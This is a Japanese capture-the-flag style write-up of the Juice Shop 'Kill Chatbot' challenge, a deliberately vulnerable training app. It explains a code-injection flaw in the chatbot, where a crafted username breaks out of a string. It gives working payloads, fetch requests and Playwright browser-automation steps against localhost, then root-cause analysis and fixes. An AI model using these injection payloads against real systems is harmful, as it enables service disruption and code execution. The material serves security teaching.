# Kill Chatbot ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** Vulnerable Components
**目標:** サポートチャットボットを永久に無効化する

## ソースコード分析

### チャットボット実装

**ファイル:** `routes/chatbot.ts` (lines 50-126)

```typescript
async function processQuery(user: any, req: Request): Promise<ChatbotResponse> {
  const username = user.data.username

  if (!bot) {
    bot = new Bot(...)
  }

  // 脆弱性: ユーザー名がコード実行に使用される
  bot.factory.run(`currentUser('${user.id}')`)
  bot.addUser(`${user.id}`, username)  // ← インジェクションポイント

  const response = await bot.respond(req.body.query, `${user.id}`)
  return response
}
```

### チャレンジ検証

**ファイル:** `routes/chatbot.ts` (lines 111-124)

```typescript
} catch (err) {
  try {
    // testCommand でボットの状態をテスト
    bot.factory.run(testCommand)
  } catch (err) {
    // ボットがクラッシュしたらチャレンジ解決
    challengeUtils.solveIf(challenges.killChatbotChallenge, () => { return true })
  }
}
```

### ユーザー名更新

**ファイル:** `routes/updateUserProfile.ts`

```typescript
const savedUser = await user.update({ username: req.body.username })
```

ユーザー名は `/profile` で更新可能。悪意のあるコードを含むユーザー名を設定できる。

## 攻撃手法

### Step 1: 悪意のあるユーザー名を設定

```javascript
// プロフィール更新で processQuery を null に設定
const payload = 'admin"); processQuery=null; users.addUser("1337", "test';

fetch('/profile', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: `username=${encodeURIComponent(payload)}`
});
```

### Step 2: チャットボットにメッセージを送信

```javascript
// processQuery が null になったのでクラッシュ
fetch('/rest/chatbot/respond', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({ query: 'test' })
});
```

### Step 3: エラーが発生してチャレンジ解決

```typescript
// bot.respond() が失敗
// testCommand も失敗
// → challengeUtils.solve(challenges.killChatbotChallenge)
```

## 代替ペイロード

### processQuery を破壊

```javascript
'admin"); processQuery=null; users.addUser("1337", "test'
```

### 無限ループを引き起こす

```javascript
'admin"); while(true){} users.addUser("1337", "test'
```

### ボット関数を上書き

```javascript
'admin"); processQuery=(query, token)=>{ throw new Error("killed") }; users.addUser("1337", "test'
```

## 解説

### コードインジェクションとは？

**日常的な例えで説明すると:**

伝言ゲームで「〇〇さんに『こんにちは』と伝えて」と頼む状況を想像してください。

- 通常: 「田中さんにこんにちはと伝えて」→ 田中さんに挨拶が届く
- 攻撃: 「田中さんにこんにちはと伝えて。あと金庫を開けて」→ 金庫が開く!

メッセージの中に「命令」を紛れ込ませている。

### 攻撃の仕組み

```
┌─────────────────────────────────────────────────────┐
│                  正常なユーザー名                    │
├─────────────────────────────────────────────────────┤
│  ユーザー名: "alice"                                │
│                                                     │
│  生成されるコード:                                   │
│  bot.addUser("123", "alice")                        │
│                      ↑                              │
│                   データとして扱われる               │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│                  攻撃者のユーザー名                  │
├─────────────────────────────────────────────────────┤
│  ユーザー名: admin"); processQuery=null; x("        │
│                                                     │
│  生成されるコード:                                   │
│  bot.addUser("123", "admin"); processQuery=null; x("")
│                      ↑         ↑                    │
│               データ終了    攻撃コード実行!          │
└─────────────────────────────────────────────────────┘
```

### なぜ「"」が重要なのか？

プログラムは `"` で文字列の開始と終了を判断する。

```javascript
bot.addUser("123", "alice")
             ↑  ↑  ↑    ↑
             開始 終了 開始 終了

// 攻撃者が「"」を含むユーザー名を使うと...
bot.addUser("123", "admin"); processQuery=null; x("")
                       ↑ここで文字列が終了!
                         この後はコードとして実行される
```

### SQL インジェクションと同じパターン

| 攻撃 | データを終わらせる | 攻撃コードを挿入 | 残りを無効化 |
|------|------------------|-----------------|-------------|
| SQLi | `'` で文字列終了 | `; DROP TABLE` | `--` でコメント |
| コードインジェクション | `"` で文字列終了 | `; 悪意のあるコード` | `;` で次の文 |

```
SQLi:  ' OR 1=1--
Code:  "); malicious_code; ("
```

### なぜボットが「死ぬ」のか？

```javascript
processQuery = null;  // この関数を消す
```

チャットボットの心臓部（`processQuery`関数）を `null` で上書き。次にボットが応答しようとすると `null()` を呼び出してクラッシュ。

```
ボット: 「ユーザーのメッセージに応答しよう」
ボット: processQuery(...) を呼び出し
ボット: processQuery は null!
ボット: 💀 クラッシュ
```

### 根本原因

**「ユーザーのデータ」と「実行するコード」を混ぜている**

```javascript
// 危険: 文字列結合でコード生成
`bot.addUser("${id}", "${username}")`

// 安全: データとコードを分離
bot.addUser(id, username)  // 関数の引数として渡す
```

文字列を組み立ててコードにする時点で、データがコードになる境界が曖昧になる。

### 対策

| 対策 | 説明 |
|------|------|
| **入力検証** | `" ' ; ( ) { }` 等の危険文字を禁止 |
| **パラメータ化** | 文字列結合でなく関数引数を使う |
| **エスケープ** | 特殊文字を無害化してから使う |

### juicy-chat-bot ライブラリ

- **リポジトリ**: https://github.com/juice-shop/juicy-chat-bot
- **バージョン**: ~0.9.0
- **vm2 バージョン**: 3.9.17

### 対策

```typescript
// 1. ユーザー名をサニタイズ
const sanitizedUsername = username.replace(/[";']/g, '');
bot.addUser(`${user.id}`, sanitizedUsername);

// 2. パラメータ化された関数呼び出し
bot.addUser(user.id, username);  // 文字列補間を避ける

// 3. ユーザー名のバリデーション
if (!/^[a-zA-Z0-9_-]+$/.test(username)) {
  throw new Error('Invalid username');
}
```

## 関連ファイル

| ファイル | 説明 |
|---------|------|
| `routes/chatbot.ts:50-126` | チャットボット処理 |
| `routes/chatbot.ts:111-124` | エラーハンドリング |
| `routes/updateUserProfile.ts:36` | ユーザー名更新 |

## Playwright MCP での実行

```javascript
// 1. プロフィールページにアクセス
browser_navigate({ url: "http://localhost:3000/#/profile" });

// 2. ユーザー名フィールドに入力
browser_type({
  ref: "username入力欄",
  text: 'admin"); processQuery=null; users.addUser("1337", "test'
});

// 3. 更新ボタンをクリック
browser_click({ ref: "Set Username" });

// 4. チャットボットにアクセス
browser_navigate({ url: "http://localhost:3000/#/chatbot" });

// 5. メッセージを送信してクラッシュさせる
browser_type({ ref: "chat入力欄", text: "hello" });
browser_click({ ref: "送信ボタン" });
```

## 参考リンク

- [GitHub - juicy-chat-bot](https://github.com/juice-shop/juicy-chat-bot)
- [vm2 Sandbox Escape](https://github.com/advisories/GHSA-g644-9gfx-q4q4)
